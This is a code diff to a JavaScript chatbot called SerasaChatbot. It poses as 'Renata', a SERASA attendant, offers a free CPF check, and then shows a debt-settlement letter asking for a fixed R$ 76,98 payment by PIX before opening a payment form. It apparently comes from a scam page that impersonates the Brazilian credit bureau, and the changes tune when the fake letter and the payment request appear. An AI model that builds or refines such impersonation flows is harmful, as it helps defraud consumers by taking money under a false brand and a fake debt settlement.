@@ -61,14 +61,15 @@ class SerasaChatbot {
 
     await this.addBotMessage("Olá, me chamo Renata e hoje serei sua atendente **SERASA!**")
 
+
+
     await this.delay(1850)
     await this.showTyping(2000)
     await this.addBotMessage(
       "Farei **GRATUITAMENTE** uma consulta para verificar se existe alguma oferta para o seu **CPF.**",
     )
 
-    const cartaHTML = this.gerarCartaQuitacao(); 
-    this.addBotCarta(cartaHTML, true);
+
 
     if (this.userData.cpf) {
       await this.delay(2500)
@@ -137,9 +138,7 @@ class SerasaChatbot {
   <style>
   
   
-    br {
-      display:none;
-    }
+   
   </style>
   <div style="
     background-color:#fff;
@@ -164,7 +163,7 @@ class SerasaChatbot {
 
     <ul style="list-style:none;padding:0;margin:2px 0;">
       <li style="margin-bottom:2px;">Acordo: Gerido pela Serasa.</li>
-      <li style="margin-bottom:2px;">Valor: R$ <span style="font-weight:bold;color:#ff007f;">${taxa}</span>.</li>
+      <li style="margin-bottom:2px;">Valor: R$ <span style="font-weight:bold;color:#ff007f;">76,98</span>.</li>
       <li style="margin-bottom:2px;">Pagamento: <strong>PIX</strong>.</li>
       <li style="margin-bottom:2px;">Válido até: <span style="font-weight:bold;color:#ff007f;">${datahoje}</span>.</li>
     </ul>
@@ -491,6 +490,11 @@ O contrato atual é válido apenas para o titular: **${this.userData.nome}**, po
 
     await this.delay(3000)
     await this.addBotAudio('./audio/audio3.mp3')
+
+
+    const cartaHTML = this.gerarCartaQuitacao(); 
+
+    this.addBotCarta(cartaHTML, true);
 
     //await this.delay(17000)
     this.showPaymentForm()
